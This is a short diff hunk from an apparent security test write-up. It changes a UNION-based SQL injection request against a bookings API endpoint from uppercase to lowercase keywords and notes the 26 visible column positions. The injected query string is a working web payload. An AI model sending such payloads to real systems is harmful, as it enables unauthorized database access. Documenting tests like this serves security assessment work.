@@ -122,7 +122,7 @@ Used ORDER BY to binary search for column count:
 
 ### Step 3: Map Output Positions
 ```http
-GET /api/bookings?status=pending' UNION SELECT 1,2,3,...,26-- HTTP/1.1
+GET /api/bookings?status=pending' union select 1,2,3,...,26-- HTTP/1.1
 ```
 **Result:** All 26 positions visible. Key mappings: status=18, created_at=19, created_by_username=26.
 
